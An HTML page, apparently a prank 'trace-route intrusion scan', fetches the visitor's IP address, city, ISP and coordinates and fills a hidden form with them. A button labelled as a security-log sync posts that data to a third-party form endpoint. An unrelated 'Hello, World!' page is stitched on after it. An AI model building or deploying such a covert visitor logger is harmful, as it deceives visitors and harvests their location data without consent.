<!DOCTYPE html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TRACE-ROUTE // GLOBAL INTERCEPT</title>
    <style>
        :root { --glow: #00ff41; --bg: #0a0a0a; --panel: #111; --danger: #ff3e3e; }
        body { 
            background: var(--bg); color: var(--glow); 
            font-family: 'Courier New', monospace; 
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; margin: 0; overflow: hidden;
        }

        #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }

        .terminal {
            width: 550px; background: var(--panel); 
            border: 1px solid var(--glow); border-radius: 5px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); padding: 25px;
            position: relative;
        }

        .header { border-bottom: 1px solid var(--glow); padding-bottom: 10px; margin-bottom: 20px; font-weight: bold; letter-spacing: 2px; }
        .line { margin: 12px 0; display: flex; justify-content: space-between; font-size: 14px; }
        .label { color: #888; }
        .data { text-shadow: 0 0 5px var(--glow); }

        .scanning { animation: blink 0.8s infinite; color: var(--danger); font-weight: bold; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }

        #syncBtn {
            background: transparent; border: 1px solid var(--glow); 
            color: var(--glow); padding: 12px; cursor: pointer;
            margin-top: 25px; width: 100%; font-family: inherit; font-weight: bold;
            transition: 0.3s;
        }
        #syncBtn:hover { background: var(--glow); color: black; box-shadow: 0 0 15px var(--glow); }
        
        #confirmMsg { display: none; text-align: center; color: cyan; margin-top: 15px; font-size: 12px; }
    </style>
</head>
<body>
    
    <img src="icon-192.png" alt="Cake">

<canvas id="matrix"></canvas>

<div class="terminal">
    <div class="header">[ SYSTEM_STATUS: INTRUSION_SCAN ]</div>
    
    <div id="status" class="scanning">BYPASSING FIREWALL... TRACING PACKETS...</div>

    <div id="results" style="display:none;">
        <div class="line"><span class="label">IPV4_ADDR:</span> <span id="ip" class="data">0.0.0.0</span></div>
        <div class="line"><span class="label">GEOLOCATION:</span> <span id="loc" class="data">Unknown</span></div>
        <div class="line"><span class="label">ISP_NET:</span> <span id="isp" class="data">Unknown</span></div>
        <div class="line"><span class="label">COORDINATES:</span> <span id="coords" class="data">0.00, 0.00</span></div>
        
        <div id="syncSection" style="margin-top:20px; border-top:1px dotted #444; padding-top:15px;">
            <p style="font-size:11px; color:#888;">[!] UPLOAD SCAN TO GLOBAL SECURITY LOG?</p>
            <button id="syncBtn" onclick="sendToDatabase()">EXECUTE CLOUD SYNC</button>
            <p id="confirmMsg">DATA PACKET ENCRYPTED & SENT TO CLOUD.</p>
        </div>
    </div>
</div>

<form id="hiddenForm" action="https://formspree.io/f/mojkerdg" method="POST" style="display:none;">
    <input type="hidden" name="Visitor_IP" id="formIP">
    <input type="hidden" name="Visitor_Location" id="formLoc">
    <input type="hidden" name="Network_ISP" id="formISP">
</form>

<script>
    // MATRIX BACKGROUND LOGIC
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const chars = "0123456789ABCDEF@#$%&*";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function drawMatrix() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#0F0";
        ctx.font = fontSize + "px monospace";
        for (let i = 0; i < drops.length; i++) {
            const text = chars.charAt(Math.floor(Math.random() * chars.length));
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 35);

    // TRACE LOGIC
    async function initTrace() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            setTimeout(() => {
                document.getElementById('status').style.display = 'none';
                document.getElementById('results').style.display = 'block';

                // Display Data
                document.getElementById('ip').innerText = data.ip;
                document.getElementById('loc').innerText = `${data.city}, ${data.country_name}`;
                document.getElementById('isp').innerText = data.org;
                document.getElementById('coords').innerText = `${data.latitude}, ${data.longitude}`;

                // Map to Hidden Form
                document.getElementById('formIP').value = data.ip;
                document.getElementById('formLoc').value = `${data.city}, ${data.country_name}`;
                document.getElementById('formISP').value = data.org;
            }, 2500);
        } catch (e) {
            document.getElementById('status').innerText = "TRACE_FAILED: SYSTEM_BLOCK";
        }
    }

    // SYNC LOGIC
    async function sendToDatabase() {
        const btn = document.getElementById('syncBtn');
        const form = document.getElementById('hiddenForm');
        
        btn.innerText = "UPLOADING DATA...";
        btn.disabled = true;
        
        const formData = new FormData(form);
        await fetch(form.action, {
            method: 'POST',
            body: formData,
            headers: { 'Accept': 'application/json' }
        });

        btn.style.display = 'none';
        document.getElementById('confirmMsg').style.display = 'block';
    }

    initTrace();
</script>

</body>
</html>

<html>
<head>
  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
  <title>Hello, World!</title>
</head>
<body>
  <h1>
    Hello, World!
  </h1>
</body>
</html>
